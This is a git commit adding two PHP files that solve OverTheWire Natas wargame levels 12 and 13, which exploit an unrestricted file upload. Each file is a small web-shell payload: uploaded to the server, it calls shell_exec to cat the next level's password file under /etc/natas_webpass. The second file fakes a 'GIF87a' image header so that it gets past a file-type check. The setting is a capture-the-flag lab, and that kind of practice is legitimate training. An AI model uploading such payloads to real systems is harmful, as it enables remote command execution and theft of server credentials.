d3f9ff527d084fd6294204c6b1da610dd772c62e
GambuzX <mg_mesquita@hotmail.com>
2019-04-21 23:04:50 +0100

    Natas Unrestricted File Upload vulnerabilities

---
+++ overthewire/natas/natas12.php
@@ -0,0 +1,6 @@
+<?php
+
+$output = shell_exec('cat /etc/natas_webpass/natas13');
+echo $output;
+
+?>
---
+++ overthewire/natas/natas13.php
@@ -0,0 +1,5 @@
+GIF87a 
+<? 
+$output = shell_exec('cat /etc/natas_webpass/natas14');
+echo $output;
+?>
